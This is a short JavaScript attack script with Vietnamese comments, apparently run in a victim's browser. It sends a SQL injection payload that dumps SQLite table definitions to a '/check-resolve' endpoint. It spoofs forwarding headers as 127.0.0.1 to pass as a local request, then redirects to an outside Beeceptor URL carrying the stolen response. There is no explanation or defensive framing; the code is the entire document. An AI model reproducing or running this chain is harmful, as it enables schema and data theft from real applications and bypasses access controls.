let formData = new URLSearchParams();

// Dùng nháy đơn bên ngoài, và hex() để bọc dữ liệu lại
// Điều này đảm bảo 100% không vỡ JSON và không bị lỗi cú pháp
formData.append('id', "-1 UNION SELECT hex(GROUP_CONCAT(sql)) FROM sqlite_master WHERE type='table'");

fetch('/check-resolve', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1'
    },
    body: formData.toString()
})
.then(response => response.text())
.then(data => {
    // Tuồn thẳng ra Beeceptor
    window.location = 'https://khanh.free.beeceptor.com/?result=' + encodeURIComponent(data);
});